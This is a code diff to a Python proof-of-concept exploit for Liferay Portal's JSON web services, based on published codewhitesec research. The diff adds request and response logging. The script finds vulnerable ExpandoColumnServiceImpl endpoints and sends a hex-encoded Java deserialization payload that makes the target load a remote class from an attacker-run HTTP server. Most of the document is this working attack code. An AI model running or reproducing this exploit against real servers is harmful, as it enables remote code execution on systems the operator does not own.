@@ -31,6 +31,7 @@ import threading
 import time
 import sys
 import argparse
+import httplib
 from bs4 import BeautifulSoup
 from datetime import datetime
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
@@ -93,13 +94,13 @@ def do_get(host, path):
 	return resp
 	
 def _do_post(url, data):
+	print("<=================================Here is the request===============================>\n")
+	patch_send()
 	resp = requests.post(url, proxies=PROXIES, verify=False,  data=data)
-	print("URL is: "+ url + "\n\nPAYLOAD" + str(data))
 	return resp
 	
 def do_post(host, path, data):
 	url = "{}/{}".format(host, path)
-#	print(url + '\n\n' + str(data))
 	resp = _do_post(url, data)
 	return resp
 	
@@ -108,15 +109,9 @@ def find_endpoints(host, path):
 	resp = do_get(host, path)
 	links = find_href(resp.text)
 	#a = links[337].get('data-metadata')	
-	#print(a)
-#	for i in range(0, len(links)):
 	for link in links:
-	#	if "java.lang.Object" in links[i].get('data-metadata'):
 		if (link.get('data-metadata')=="ExpandoColumnServiceImpl"):
 			result.append(link['href'])
-       #         if "ExpandoColumnServiceImpl" in link.get('data-metadata'):
-	#		print(link["href"])
-	#		result.append(link['href'])
 	return result
 
 def find_parameters(body):
@@ -145,8 +140,16 @@ def pad(data, length):
 def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE):
 	p = set_params(params, PAYLOAD, PAYLOAD_TYPE)
 	resp = do_post(host, api_url, p)
+	print("\n\n<=======================Response====================>"+"\n"+ resp.text)
 
 banner = """POC author: mzero\r\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research"""
+
+def patch_send():
+    old_send= httplib.HTTPConnection.send
+    def new_send( self, data ):
+        print data
+        return old_send(self, data) #return is not necessary, but never hurts, in case the library is changed
+    httplib.HTTPConnection.send= new_send
 
 def main():
 	print(banner)
@@ -168,11 +171,9 @@ def main():
 	PAYLOAD_PREFIX = """{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8"""
 	PAYLOAD_SUFIX = """740003466f6f;"}"""
 	PAYLOAD = PAYLOAD_PREFIX +pad("http://{}:{}/".format(bind_ip, bind_port), 200).encode("hex")+PAYLOAD_SUFIX
-	print(pad("http://{}:{}/".format(bind_ip, bind_port),200).encode("hex"))
 	try:
 		log("info", "Looking for vulnerable endpoints: {}/{}".format(target_ip, api_url))
 		endpoints = find_endpoints(target_ip, api_url)
-		# print(endpoints)
 		if not endpoints:
 			log("info", "Vulnerable endpoints not found!")
 			sys.exit(1)
@@ -198,7 +199,6 @@ def main():
 			op = raw_input("Do you want to test it? Y/N: ")
 			if op.lower() == "y":
 				exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE)
-				#print(a)
 		log("info", "CTRL+C to exit :)")
 		while True:
 			time.sleep(1)
